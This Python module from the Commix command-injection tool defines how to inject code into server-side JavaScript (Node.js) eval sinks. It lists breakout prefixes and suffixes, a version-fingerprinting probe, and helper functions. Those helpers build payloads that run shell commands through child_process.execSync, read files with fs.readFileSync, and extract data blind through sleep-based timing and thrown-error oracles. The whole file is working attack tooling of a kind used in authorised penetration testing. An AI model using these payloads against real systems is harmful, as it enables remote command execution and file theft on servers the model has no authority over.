#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

NAME = "javascript"

# The same name as it is written out to the user, where the switch's own spelling would read wrong.
LABEL = "JavaScript"

"""
An expression whose value says at once that code was evaluated, and which build evaluated it.

Node carries no single banner the way Python's 'sys.version' or Ruby's 'RUBY_DESCRIPTION' do, so
this joins the three values that together are unique to a Node build - version, platform, and
architecture - into one string a payload's own regex reads back in one piece.
"""
PROBE = "process.version+process.platform+process.arch"

# The probe on its own, and coerced to a string where the bare expression is not rendered as one -
# it already is one, but a sink built for a value never rendered as text may still expect a call.
PROBE_FUNCTIONS = ["" + PROBE + "",
  "String(" + PROBE + ")",
  "(" + PROBE + ").toString()"
]

# The same probes broken into the string being evaluated, one boundary per row - each row pairing a
# prefix with the suffix that closes it, the way the boundaries below are paired.
PROBE_PAYLOADS = [
  [x for x in PROBE_FUNCTIONS],
  ["+" + x for x in PROBE_FUNCTIONS],
  ["'+" + x + "+'" for x in PROBE_FUNCTIONS],
  ["\"+" + x + "+\"" for x in PROBE_FUNCTIONS],
  ["')+" + x + "+('" for x in PROBE_FUNCTIONS]
]

PROBE_PAYLOADS = [x for payload in PROBE_PAYLOADS for x in payload]

# What the probe's own value looks like coming back, and the complaints that say a payload reached
# an evaluated string even where nothing was rendered.
PROBE_REGEX = r"(v\d+\.\d+\.\d+)(?:linux|darwin|win32|freebsd|openbsd|sunos|aix)(?:x64|arm64|arm64?|ia32|ppc64|s390x)"
WARNINGS = ["SyntaxError", "ReferenceError", "is not defined", "Unexpected token", "at eval "]

"""
The language's own callables that run a command, widest first as the level rises.

Each is written out whole, the 'require' included: there is no bare name for these the way a
language with them built in would have, and the prefix below only adds the bracket.
"""
EXECUTION_FUNCTIONS_LVL1 = ["require(\"child_process\").execSync"]
EXECUTION_FUNCTIONS_LVL2 = EXECUTION_FUNCTIONS_LVL1 + ["require(\"child_process\").exec"]
EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2 + ["require(\"child_process\").spawnSync", "eval"]

# Breaking out of the evaluated string, and closing it again behind the payload.
SEPARATORS_LVL1 = [""]
SEPARATORS_LVL2 = SEPARATORS_LVL1 + ["\n"]
SEPARATORS_LVL3 = SEPARATORS_LVL2 + ["\r\n"]

# The whole value as the expression, concatenation onto a value that is already one, and
# concatenation out of a quoted string the value sits inside.
PREFIXES_LVL1 = ["", "+", "'+", "\"+"]
# Closing a call the value sits inside, and a further argument to one.
PREFIXES_LVL2 = PREFIXES_LVL1 + ["')+", "\")+", "',", "\","]
# Ending the statement outright, where the sink runs statements rather than an expression.
PREFIXES_LVL3 = PREFIXES_LVL2 + ["';", "\";", ";", ")", "']", "\"]", "'}", "\"}"]

SUFFIXES_LVL1 = ["", "+'", "+\""]
# Closing the call again, and commenting out whatever the application appends behind it - this
# language's line comment is '//', not the '#' another dynamic language would use here.
SUFFIXES_LVL2 = SUFFIXES_LVL1 + ["+('", "+(\"", "//"]
SUFFIXES_LVL3 = SUFFIXES_LVL2 + ["'//", "\"//", ")//", "]//", "}//", ",'", ",\""]

# How one of the functions above is reached, as a prefix a payload is wrapped in.
def execution_prefix(function):
  return function + "("

"""
Wrap the shell commands a payload runs in what this language renders them with.

There is no statement here that writes to the response the way another language's print does: what
the application renders is the value of the expression it evaluated, so the commands' output is
concatenated and handed back as that value.
"""
def print_statement(separator, commands, chain=None):
  if separator == "":
    return "+".join(run(command) for command in commands)
  return run((chain or separator).join(commands))

"""
The expressions every payload is built out of, spelled the way this language spells them.

What a technique asks of a sink is the same whichever language is evaluating: run this, tell me how
long the answer is, tell me its Nth byte, wait this long if the answer is yes. Only the spelling
differs - so the techniques ask through the names below, and a language is added by writing them
again rather than by touching a payload.
"""

# A string literal holding the given text.
def _literal(text):
  return "\"" + text.replace("\\", "\\\\").replace("\"", "\\\"") + "\""

# Run a command and yield its output. 'execSync' answers with a Buffer, not the string itself.
def run(cmd):
  return "require(\"child_process\").execSync(" + _literal(cmd) + ").toString()"

# Read a file and yield its contents.
def read_file(path):
  return "require(\"fs\").readFileSync(" + _literal(path) + ").toString()"

# Drop trailing whitespace, so a length agrees with what a shell's own substitution would report -
# both ends rather than the one, the way another language's grammar does it here, would disagree
# with that substitution on any output that opens with whitespace of its own.
def trim(expr):
  return "(" + expr + ").trimEnd()"

# How many bytes an expression is.
def length(expr):
  return "(" + expr + ").length"

# The ordinal of an expression's Nth byte, counting from zero. 'charCodeAt' answers 'NaN' past the
# end, which the search would read as a comparison that is never true - answering zero instead
# says plainly that nothing is there, the way every other language's grammar here does too.
def ordinal(expr, index):
  return "(" + expr + ").charCodeAt(" + str(index) + ")||0"

# An expression's value read as a number, for a command whose output is one.
def to_number(expr):
  return "(Number(" + expr + ")||0)"

"""
Wait for as long as the condition is true, and no time at all when it is false.

There is no synchronous sleep built into the language itself - only a callback-based timer, which a
single expression cannot wait on - so the delay is asked of the shell instead, through the same
'execSync' the rest of this grammar already reaches a command with.
"""
def delay(timesec, condition):
  return "((" + condition + ")?require(\"child_process\").execSync(\"sleep " + str(timesec) + "\"):0)"

"""
Stop the page where the condition does not hold, so what comes back says which it was.

Thrown rather than exiting the process outright: a request handler here usually runs inside a
server the same process goes on serving other requests from, unlike the per-request worker another
language's grammar can afford to end. An uncaught throw reaches the same result - the response the
target sends back differs from the one a satisfied condition renders - without taking that server
down for every request after this one. Wrapped in a call, since 'throw' is a statement and this
sits inside a ternary, which only takes expressions on either side.
"""
def halt(condition):
  # Empty string rather than a number: the value is spliced into whatever the target was building,
  # and only a string leaves that expression intact for the page to render as it normally would.
  return "((" + condition + ")?\"\":(()=>{throw new Error()})())"

"""
Evaluate one expression and then another, within a single expression.

The comma operator: it evaluates its left side, discards the value, then evaluates and yields its
right side - built for exactly this, unlike the tuple or concatenation another language's grammar
has to reach for here instead.
"""
def sequence(first, second):
  return "(" + first + "," + second + ")"

# What ends a statement, where the boundary being tested can carry one.
TERMINATOR = ";"

# eof
